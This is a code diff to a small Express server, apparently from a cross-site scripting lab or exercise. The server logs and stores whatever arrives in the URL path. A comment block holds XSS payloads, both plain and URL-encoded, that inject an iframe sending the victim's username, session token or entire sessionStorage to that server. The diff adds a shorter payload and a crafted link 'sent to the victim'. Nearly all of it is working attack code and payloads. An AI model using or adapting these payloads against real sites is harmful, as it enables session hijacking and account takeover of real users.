@@ -45,11 +45,32 @@ app.post('/post/:username/:password', function(req, res) {
 
 });
 
+app.post('/:payload', function(req, res) {
+  console.log("post '/:payload'")
+
+  console.log(req.params)
+
+  insertRow(req.params.payload, "none");
+
+  res.send("thanks");
+
+});
+
+app.get('/:payload', function(req, res) {
+  console.log("get '/:payload'")
+
+  console.log(req.params)
+
+  insertRow(req.params.payload, "none");
+
+  res.send("thanks");
+
+});
 
 
 app.listen(3001);
 
-console.log("listening on 3001")
+console.log("listening on port 3001")
 
 /*
 
@@ -62,6 +83,12 @@ document.write('<script>document.write("<iframe src=http://localhost:3001/user/"
 document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2Fuser%2F%22%2BsessionStorage.getItem%28%22username%22%29%2B%22%2F%22%2BsessionStorage.getItem%28%22sessionToken%22%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29%0D%0A%0D%0A
 
 http://localhost:3000/user/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2Fuser%2F%22%2BsessionStorage.getItem%28%22username%22%29%2B%22%2F%22%2BsessionStorage.getItem%28%22sessionToken%22%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29%0D%0A%0D%0A
+
+shorter version
+
+document.write('<script>document.write("<iframe src=http://localhost:3001/"+JSON.stringify(sessionStorage)+"></iframe>");</script>')
+
+http://localhost:3000/user/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29
 
 we send the previous link to victim
 
